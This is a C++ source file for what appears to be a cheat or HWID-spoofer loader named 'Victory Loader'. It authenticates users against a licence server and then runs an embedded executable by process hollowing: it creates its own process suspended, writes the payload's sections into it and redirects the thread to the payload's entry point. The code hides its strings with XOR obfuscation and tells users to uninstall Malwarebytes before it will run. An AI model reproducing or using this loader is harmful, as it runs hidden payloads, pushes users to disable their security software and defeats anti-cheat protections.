#include "main.h"
#include "conn.h"
#include "aes.hpp"
#include "xor.hpp"
#include "hwid.h"
#include "DriverLoad.h"
#include "cheat.h"
#ifndef _COLORS_
#define _COLORS_

/* FOREGROUND */
#define RST  "\x1B[0m"
#define KRED  "\x1B[31m"
#define KGRN  "\x1B[32m"
#define KYEL  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMAG  "\x1B[35m"
#define KCYN  "\x1B[36m"
#define KWHT  "\x1B[37m"

#define FRED(x) KRED x RST
#define FGRN(x) KGRN x RST
#define FYEL(x) KYEL x RST
#define FBLU(x) KBLU x RST
#define FMAG(x) KMAG x RST
#define FCYN(x) KCYN x RST
#define FWHT(x) KWHT x RST

#define BOLD(x) "\x1B[1m" x RST
#define UNDL(x) "\x1B[4m" x RST

#endif  /* _COLORS_ */


std::string user_key;
std::string password;

#pragma warning(disable : 4996)

bool createClient() {
    m_Client = std::make_unique<Client>();
    if (m_Client->isSetup()) return true;
    else return false;
}

// Create file from a vector
std::vector<unsigned char> data{};
void CreateFileFromBytes(std::string path, std::vector<unsigned char>vector) {
    std::ofstream outfile(path, std::ios::out | std::ios::binary);
    outfile.write((const char*)&vector[0], vector.size());
}

std::string UserExpire = _xor_("");
std::string UserExpire2 = _xor_("");

int GetServiceStatus(const char* name)
{
    SC_HANDLE theService, scm;
    SERVICE_STATUS m_SERVICE_STATUS;
    SERVICE_STATUS_PROCESS ssStatus;
    DWORD dwBytesNeeded;


    scm = OpenSCManager(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scm) {
        return 0;
    }

    theService = OpenService(scm, name, SERVICE_QUERY_STATUS);
    if (!theService) {
        CloseServiceHandle(scm);
        return 0;
    }

    auto result = QueryServiceStatusEx(theService, SC_STATUS_PROCESS_INFO,
        reinterpret_cast<LPBYTE>(&ssStatus), sizeof(SERVICE_STATUS_PROCESS),
        &dwBytesNeeded);

    CloseServiceHandle(theService);
    CloseServiceHandle(scm);

    if (result == 0) {
        return 0;
    }

    return ssStatus.dwCurrentState;
}

void Scenes::Cheat() {
    system("cls");

    if (GetServiceStatus(_xor_("MBAMService").c_str()) == SERVICE_RUNNING) {
        printf(_xor_("Please uninstall malwarebytes, until then you will not be able to use.").c_str());
        Sleep(2500);
        exit(0);
    }

    BYTE* pe = rawData;

    IMAGE_DOS_HEADER* DOSHeader;
    IMAGE_NT_HEADERS64* NtHeader;
    IMAGE_SECTION_HEADER* SectionHeader;

    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;
    ZeroMemory(&PI, sizeof(PI));
    ZeroMemory(&SI, sizeof(SI));


    void* pImageBase;

    char currentFilePath[1024];

    DOSHeader = PIMAGE_DOS_HEADER(pe);
    NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);

    if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {

        GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);
        //create process
        if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {

            CONTEXT* CTX;
            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
            CTX->ContextFlags = CONTEXT_FULL;


            UINT64 imageBase = 0;
            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
                pImageBase = VirtualAllocEx(
                    PI.hProcess,
                    LPVOID(NtHeader->OptionalHeader.ImageBase),
                    NtHeader->OptionalHeader.SizeOfImage,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE
                );


                WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
                //write pe sections
                for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
                {
                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(pe) + DOSHeader->e_lfanew + 264 + (i * 40));

                    WriteProcessMemory(
                        PI.hProcess,
                        LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),
                        LPVOID(DWORD64(pe) + SectionHeader->PointerToRawData),
                        SectionHeader->SizeOfRawData,
                        NULL
                    );
                    WriteProcessMemory(
                        PI.hProcess,
                        LPVOID(CTX->Rdx + 0x10),
                        LPVOID(&NtHeader->OptionalHeader.ImageBase),
                        8,
                        NULL
                    );

                }

                CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
                SetThreadContext(PI.hThread, LPCONTEXT(CTX));
                ResumeThread(PI.hThread);

                WaitForSingleObject(PI.hProcess, NULL);




            }
        }
    }



}



//  13 15 16 19
void Scenes::Login() {
    



    std::cout << _xor_(" Thanks for choosing us! , We are ready do you?\n") << std::endl;
    std::cout << _xor_("|-> Username: ");
    std::cin >> user_key;
    std::cout << _xor_("|-> Password: ");
    std::cin >> password;
    user_key = mixer(user_key, _xor_(";"), password, _xor_(";"), getHWinfo64(), _xor_(";"), _xor_("HWIDSpoofer"), _xor_(";"), _xor_("1"));
     
    if (!user_key.empty()) {
        std::string successLogin = _xor_("SUCCESS_LOGIN");
        std::string APIERROR = _xor_("API_BAD_PROBLEM");
        std::string VERSIONERROR = _xor_("WRONG_VERSION_ER");
        std::string WRONGPRODUCT = _xor_("WRONG_PRODUCT_CHECK");


        std::string loginQuery = aes_enc->decrypt(
        m_Client->cipher_key, m_Client->iv_key, m_Client->sendrecieve(
            aes_enc->encrypt(m_Client->cipher_key, m_Client->iv_key, user_key)
        ));




        
        if (loginQuery.size() == successLogin.size()) { Cheat(); }
        else if (loginQuery.size() == APIERROR.size())     { std::cout << BOLD(FRED("API ERROR!")) << std::endl;  Sleep(4000);  exit(0); }
        else if (loginQuery.size() == VERSIONERROR.size()) { std::cout << BOLD(FRED("Wrong version pls download updated one!")) << std::endl;  Sleep(4000);  exit(0); }
        else if (loginQuery.size() == WRONGPRODUCT.size()) { std::cout << BOLD(FRED("You no has access to this product!")) << std::endl;  Sleep(4000);  exit(0);  }




        } 

   


    else {  std::cout << BOLD(FRED("Login failed!")) << std::endl;  Sleep(2000);  exit(0);  }
       
    }


int main() {
    std::string str("      # Victory Loader Version 0.1 #");
    SetConsoleTitle(str.c_str());
    // Create client
    if (!createClient()) return 0;
    // Login scene
    m_Scenes->Login();
    return 0;
}